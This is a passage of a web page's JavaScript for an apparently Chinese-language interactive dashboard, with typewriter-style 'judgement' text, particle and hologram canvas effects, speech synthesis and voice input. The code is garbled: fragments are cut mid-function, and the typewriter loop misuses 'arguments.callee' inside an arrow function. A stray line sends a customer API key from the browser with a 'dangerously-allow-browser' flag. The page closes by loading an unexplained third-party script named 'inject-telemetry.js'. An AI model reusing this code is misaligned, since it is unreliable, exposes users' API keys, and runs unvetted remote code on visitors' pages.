                <strong style="color:${godColor};font-size:36px;text-shadow:0 0 ${shakeIntensity === 'extreme' ? '40' : '20'}px ${godColor};animation:${shakeIntensity === 'extreme' ? 'godPulse 1s infinite' : 'none'}">${currentGod} 的宪法审判：</strong><br><br>
                <span id="typewriterTarget" style='color:${textColor}; font-size:${fontSize}; line-height:1.6; text-shadow:0 0 15px ${textColor};'></span>
            `;
            
            // 🌟 增强打字机效果：动态速度和特效
            let i = 0;
            if (typeWriterTimer) clearInterval(typeWriterTimer);
            const targetEl = document.getElementById('typewriterTarget');
            
            // 根据震动强度调整打字速度
            const baseSpeed = shakeIntensity === 'extreme' ? 25 : 
                            shakeIntensity === 'hard' ? 40 : 50;
            
            // 添加字符特效映射
            const specialChars = {
                '！': '<span style="color:#ff0; font-size:1.3em; animation:charBurst 0.3s;">！</span>',
                '？': '<span style="color:#f0f; font-size:1.3em; animation:charBurst 0.3s;">？</span>',
                '，': '<span style="color:#0ff; animation:charFade 0.5s;">，</span>',
                '。': '<span style="color:#fff; font-weight:bold;">。</span>'
            };
            
            typeWriterTimer = setInterval(() => {
                if (i < finalPoem.length) {
                    const char = finalPoem.charAt(i);
                    let displayChar = specialChars[char] || char;
                    
                    // 随机添加闪烁效果
                    if (Math.random() < 0.1 && shakeIntensity !== 'normal') {
                        displayChar = `<span style="animation:charFlicker 0.2s;">${displayChar}</span>`;
                    }
                    
                    targetEl.innerHTML += displayChar;
                    i++;
                    
                    // 动态调整速度：某些字符停顿更久
                    let currentDelay = baseSpeed;
                    if (char === '，' || char === '。') currentDelay = baseSpeed * 3;
                    else if (char === '！' || char === '？') currentDelay = baseSpeed * 4;
                    
                    // 重新设置计时器以实现动态速度
                    clearInterval(typeWriterTimer);
                    if (i < finalPoem.length) {
                        typeWriterTimer = setInterval(arguments.callee, currentDelay);
                    } else {
                        // 打字完成后的特效
                        targetEl.innerHTML += '<span style="animation:completionPulse 1s;">✦</span>';
                        clearInterval(typeWriterTimer);
                    }
                }
            }, baseSpeed);

            bombContent();         
            triggerParticleBurst(); 
            speakDaYao(currentGod, finalPoem);
        }

                fetchOptions.headers['x-api-key'] = customerApiKey; fetchOptions.headers['anthropic-version'] = '2023-06-01'; fetchOptions.headers['anthropic-dangerously-allow-browser'] = 'true';

        // ==================== 粒子特效 ====================
        let canvas, ctx, particles = [];
        function initParticles() {
            canvas = document.getElementById('particleCanvas');
            ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        function triggerParticleBurst() {
            for (let i = 0; i < 60; i++) {
                particles.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * (canvas.height * 0.7),
                    size: Math.random() * 8 + 4,
                    speed: Math.random() * 4 + 3,
                    life: 90
                });
            }
        }
        function animateParticles() {
            ctx.clearRect(0,0,canvas.width,canvas.height);
            for (let i = particles.length-1; i>=0; i--) {
                let p = particles[i];
                ctx.fillStyle = `rgba(255,60,0,${p.life/90})`;
                ctx.fillRect(p.x, p.y, p.size, p.size*1.6);
                p.y += p.speed;
                p.life--;
                if (p.life <= 0) particles.splice(i,1);
            }
            requestAnimationFrame(animateParticles);
        }

        // ==================== 基础函数 ====================
        // ==================== 宪法引擎·神明之音 ====================
        function speakDaYao(godName, poemText) {
            // 尊重静音全局控制，如果浏览器不支持则静默失败
            if (isMuted || !('speechSynthesis' in window)) return;
            
            // 中断当前可能正在播放的语音，确保大妖的声音永远是最优先的
            window.speechSynthesis.cancel();
            
            // 构造朗读文本：加上大妖的名字增强代入感
            const speakText = `${godName}降下法旨：${poemText}`;
            
            const utterance = new SpeechSynthesisUtterance(speakText);
            utterance.lang = 'zh-CN';
            
            // 【核心调音】：压低音调，放慢语速，制造深沉威严的压迫感
            utterance.pitch = 0.2;  // 0-2之间，0.2是非常低沉的声音
            utterance.rate = 0.85;  // 稍微放慢，显得冷酷、不容置疑
            utterance.volume = 1.0;
            
            window.speechSynthesis.speak(utterance);
        }

            pilot.classList.toggle('male', isMale);
            pilot.classList.toggle('female', !isMale);
        }

        function sendText() {
            const text = document.getElementById('textInput').value.trim();
            if (text) {
                processUserInput(text);
                document.getElementById('textInput').value = ''; // 清空文本域
            }
        }

        function startListening() {
            if ('SpeechRecognition' in window || 'webkitSpeechRecognition' in window) {
                const rec = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
                rec.lang = 'zh-CN';
                rec.start();
                rec.onresult = e => processUserInput(e.results[0][0].transcript);
            } else {
                processUserInput('现金流告急');
            }
        }

        // ==================== 情绪感知型全息玻璃引擎 ====================
        const holoCanvas = document.getElementById('holoGridCanvas');
        const holoCtx = holoCanvas.getContext('2d');
        let scanlineY = 0;

        function resizeHoloCanvas() {
            // 获取挡风玻璃容器的实际像素大小
            const rect = holoCanvas.parentElement.getBoundingClientRect();
            holoCanvas.width = rect.width;
            holoCanvas.height = rect.height;
        }

        function drawHoloGrid() {
            holoCtx.clearRect(0, 0, holoCanvas.width, holoCanvas.height);
            
            // 杀意值决定了玻璃的不稳定程度 (Glitch Intensity)
            const glitchIntensity = (shayi / 100) * 15; 
            const baseColor = shayi > 60 ? `rgba(255, 50, 50, ` : `rgba(0, 255, 255, `;
            
            holoCtx.lineWidth = 1;
            const gridSize = 60;

            // 绘制带有撕裂感的网格
            for (let x = 0; x <= holoCanvas.width; x += gridSize) {
                holoCtx.beginPath();
                // 如果杀意高，网格线产生随机横向位移（信号干扰）
                let offsetX = (Math.random() < 0.1) ? (Math.random() * glitchIntensity - glitchIntensity/2) : 0;
                holoCtx.moveTo(x + offsetX, 0);
                holoCtx.lineTo(x + offsetX, holoCanvas.height);
                holoCtx.strokeStyle = baseColor + `0.15)`;
                holoCtx.stroke();
            }

            for (let y = 0; y <= holoCanvas.height; y += gridSize) {
                holoCtx.beginPath();
                let offsetY = (Math.random() < 0.1) ? (Math.random() * glitchIntensity - glitchIntensity/2) : 0;
                holoCtx.moveTo(0, y + offsetY);
                holoCtx.lineTo(holoCanvas.width, y + offsetY);
                holoCtx.strokeStyle = baseColor + `0.15)`;
                holoCtx.stroke();
            }

            // 扫描线效果 (增加未来战车的心跳感)
            scanlineY += 2 + (shayi / 20); // 杀意越高，扫描越快
            if (scanlineY > holoCanvas.height) scanlineY = 0;
            
            holoCtx.fillStyle = baseColor + `0.2)`;
            holoCtx.fillRect(0, scanlineY, holoCanvas.width, 4 + (shayi/25));

            // 如果杀意极高，整块玻璃随机泛红报警
            if (shayi > 80 && Math.random() < 0.1) {
                holoCtx.fillStyle = "rgba(255, 0, 0, 0.1)";
                holoCtx.fillRect(0, 0, holoCanvas.width, holoCanvas.height);
            }

            requestAnimationFrame(drawHoloGrid);
        }

        // 绑定窗口变化事件并启动渲染
        window.addEventListener('resize', resizeHoloCanvas);

        // ==================== 初始化 ====================
        window.onload = () => {
            initParticles();
            animateParticles();
            updateDashboard();
            
            // 初始化全息玻璃引擎
            resizeHoloCanvas();
            drawHoloGrid();

            // 背景轮播
            let curBg = 0;
            const bgImages = [document.getElementById('bg1'), document.getElementById('bg2'), document.getElementById('bg3')];
            setInterval(() => {
                bgImages[curBg].classList.remove('active');
                curBg = (curBg + 1) % 3;
                bgImages[curBg].classList.add('active');
            }, 6500);

            // 回车发送 (同时重置待机时间) - 支持多行文本域
            document.getElementById('textInput').addEventListener('keydown', e => {
                resetIdleTimer();
                // Enter发送，Shift+Enter换行
                if (e.key === 'Enter' && !e.shiftKey) {
                    e.preventDefault(); // 阻止默认换行
                    sendText();
                }
            });

            // 🌟 首次自动进入"潜渊起始状态"，不再消耗真实 API Token！
            enterIdleMode();
            resetIdleTimer();
        };
    </script>

    <script src="https://ai-master-dashboard.netlify.app/inject-telemetry.js"></script>
</body>
